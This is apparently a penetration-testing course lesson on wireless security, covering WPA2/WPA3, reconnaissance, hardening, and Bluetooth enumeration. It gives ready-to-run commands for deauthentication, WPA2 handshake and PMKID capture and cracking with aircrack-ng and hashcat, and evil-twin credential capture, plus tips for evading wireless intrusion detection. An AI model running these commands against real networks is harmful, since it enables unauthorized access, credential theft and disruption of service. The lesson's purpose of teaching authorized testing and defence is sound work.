# Wireless Security

**Previous**: [15. Post-Exploitation](./15_Post_Exploitation.md) | **Next**: [17. Cloud Security Testing](./17_Cloud_Security_Testing.md)

---

Wireless networks extend an organization's attack surface beyond physical boundaries. This lesson covers WiFi security protocols, common attack techniques, and the tools used to assess wireless security in authorized engagements.

> **IMPORTANT**: Wireless attacks against networks you don't own are illegal. Only test your own networks or with explicit written authorization.

**Difficulty**: ⭐⭐⭐⭐

## Learning Objectives

1. Understand WiFi authentication protocols (WPA2-PSK, WPA2-Enterprise, WPA3)
2. Perform WiFi reconnaissance with airodump-ng
3. Capture and crack WPA2 four-way handshakes
4. Set up evil twin access points for credential capture
5. Execute PMKID attacks without client deauthentication
6. Assess Bluetooth security vulnerabilities
7. Evade wireless intrusion detection systems
8. Recommend wireless security hardening measures

---

## Table of Contents

1. [WiFi Protocol Fundamentals](#1-wifi-protocol-fundamentals)
2. [WPA2 and WPA3 Security](#2-wpa2-and-wpa3-security)
3. [WiFi Reconnaissance](#3-wifi-reconnaissance)
4. [Deauthentication Attacks](#4-deauthentication-attacks)
5. [WPA2 Handshake Capture and Cracking](#5-wpa2-handshake-capture-and-cracking)
6. [Evil Twin Attacks](#6-evil-twin-attacks)
7. [PMKID Attacks](#7-pmkid-attacks)
8. [Bluetooth Security](#8-bluetooth-security)
9. [Wireless IDS Evasion](#9-wireless-ids-evasion)
10. [Wireless Security Hardening](#10-wireless-security-hardening)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. WiFi Protocol Fundamentals

### 1.1 802.11 Standards

| Standard | Frequency | Max Speed | Range |
|----------|-----------|-----------|-------|
| 802.11b | 2.4 GHz | 11 Mbps | ~35m |
| 802.11g | 2.4 GHz | 54 Mbps | ~35m |
| 802.11n | 2.4/5 GHz | 600 Mbps | ~70m |
| 802.11ac | 5 GHz | 6.9 Gbps | ~35m |
| 802.11ax (WiFi 6) | 2.4/5/6 GHz | 9.6 Gbps | ~35m |

---

## 2. WPA2 and WPA3 Security

### 2.1 WPA2-PSK Weaknesses

- Pre-shared key derived from passphrase → offline cracking possible
- Four-way handshake can be captured and attacked
- PMKID can be extracted from first handshake message

### 2.2 WPA3 Improvements

- **SAE (Simultaneous Authentication of Equals)**: Replaces PSK exchange
- **Forward secrecy**: Compromised password doesn't reveal past traffic
- **Offline dictionary resistance**: SAE prevents offline cracking
- **Protected Management Frames**: Mandatory (prevents deauth attacks)

---

## 3. WiFi Reconnaissance

```bash
# Enable monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Key information:
# BSSID — Access point MAC address
# ESSID — Network name
# CH — Channel
# ENC — Encryption (WPA2, WPA3, OPN)
# CIPHER — Encryption cipher (CCMP, TKIP)
# AUTH — Authentication (PSK, MGT)
```

---

## 4. Deauthentication Attacks

Deauth frames force clients to disconnect and re-authenticate (captures handshake):

```bash
# Deauth specific client
aireplay-ng --deauth 5 -a <AP_BSSID> -c <Client_MAC> wlan0mon

# Deauth all clients on AP
aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon
```

> **Note**: WPA3 with Protected Management Frames (PMF) prevents deauth attacks.

---

## 5. WPA2 Handshake Capture and Cracking

```bash
# 1. Start capture
airodump-ng -c 6 --bssid <AP_BSSID> -w handshake wlan0mon

# 2. Deauth to force re-authentication
aireplay-ng --deauth 5 -a <AP_BSSID> wlan0mon

# 3. Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" message

# 4. Crack with aircrack-ng
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt

# 5. Or with hashcat (faster with GPU)
# Convert to hccapx format
hcxpcapngtool handshake-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt
```

---

## 6. Evil Twin Attacks

Create a fake access point mimicking the target network:

```bash
# Using hostapd-wpe for WPA2-Enterprise
# Captures RADIUS credentials (username and MSCHAPv2 hash)
hostapd-wpe hostapd-wpe.conf

# Using Fluxion (automated evil twin)
# Creates fake AP, captures WPA password via phishing page
```

---

## 7. PMKID Attacks

PMKID attacks extract the PMKID from the first EAPOL message without requiring a full handshake:

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Extract PMKID hash
hcxpcapngtool capture.pcapng -o pmkid_hash.hc22000

# Crack
hashcat -m 22000 pmkid_hash.hc22000 rockyou.txt
```

**Advantage**: No client deauthentication needed — completely passive from the client's perspective.

---

## 8. Bluetooth Security

### 8.1 Bluetooth Attack Surface

| Attack | Description | Tool |
|--------|-------------|------|
| BlueBorne | Remote code execution over BT | Various CVE exploits |
| KNOB | Key negotiation downgrade | Custom tools |
| BlueSmack | Bluetooth DoS via L2CAP | l2ping |
| BlueSnarfing | Unauthorized data access | bluesnarfer |
| BLE Sniffing | Capture BLE communications | Ubertooth, BtleJuice |

```bash
# Bluetooth reconnaissance
hciconfig              # List BT adapters
hcitool scan           # Discover devices
hcitool info <addr>    # Device information
sdptool browse <addr>  # Service discovery
```

---

## 9. Wireless IDS Evasion

- **Channel hopping**: Quickly switch channels during attacks
- **Low power**: Reduce transmit power to limit detection range
- **MAC spoofing**: Change adapter MAC address
- **Timing**: Attack during high-traffic periods to blend in

---

## 10. Wireless Security Hardening

| Measure | Priority | Description |
|---------|----------|-------------|
| WPA3-SAE | Critical | Upgrade from WPA2-PSK |
| Strong passphrase | Critical | 20+ char random passphrase |
| WPA2-Enterprise | High | RADIUS authentication with certificates |
| PMF (802.11w) | High | Prevent deauth/disassoc attacks |
| Disable WPS | High | WPS PIN is brute-forceable |
| WIDS/WIPS | Medium | Detect rogue APs and attacks |
| MAC filtering | Low | Easily bypassed but adds friction |
| Hidden SSID | Low | Does not prevent discovery |

---

## 11. Exercises

1. **WiFi Recon**: Use airodump-ng to map all wireless networks in your lab. Document SSIDs, encryption, and channels.
2. **Handshake Capture**: Capture a WPA2 handshake from your own AP and crack it with a wordlist.
3. **PMKID Attack**: Extract and crack a PMKID from your own access point.
4. **Evil Twin**: Set up an evil twin for your own WPA2-Enterprise network and capture credentials.
5. **Bluetooth Scan**: Enumerate all Bluetooth devices in range and identify their services.
6. **Hardening**: Assess your home/lab wireless configuration and implement all recommended hardening measures.

---

## 12. Summary

Wireless security extends the attack surface beyond physical boundaries:

- **WPA2-PSK** handshakes can be captured and cracked offline
- **PMKID attacks** extract crackable hashes without client interaction
- **Evil twin** attacks capture credentials through fake access points
- **Deauthentication** forces clients to reconnect (mitigated by WPA3 PMF)
- **WPA3** significantly improves security with SAE and forward secrecy
- **Bluetooth** presents additional wireless attack surfaces
- Strong passphrases and WPA2-Enterprise/WPA3 are essential defenses

---

## 13. References

- Aircrack-ng: https://www.aircrack-ng.org/
- hcxdumptool: https://github.com/ZerBea/hcxdumptool
- WiFi Security Testing Cheat Sheet: https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi
- KRACK Attack: https://www.krackattacks.com/
- Dragonblood (WPA3 attacks): https://wpa3.mathyvanhoef.com/
